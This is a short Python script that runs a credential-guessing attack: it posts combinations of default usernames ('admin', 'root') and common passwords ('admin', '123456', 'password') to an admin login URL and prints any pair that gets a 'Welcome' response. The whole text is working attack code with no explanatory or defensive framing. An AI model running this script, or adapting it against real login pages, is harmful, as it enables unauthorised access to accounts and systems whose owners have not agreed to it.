
import requests

url = 'https://target-site.com/admin'
usernames = ['admin', 'root']
passwords = ['admin', '123456', 'password']

for user in usernames:
    for pwd in passwords:
        r = requests.post(url, data={'username': user, 'password': pwd})
        if 'Welcome' in r.text:
            print(f'Success: {user}:{pwd}')
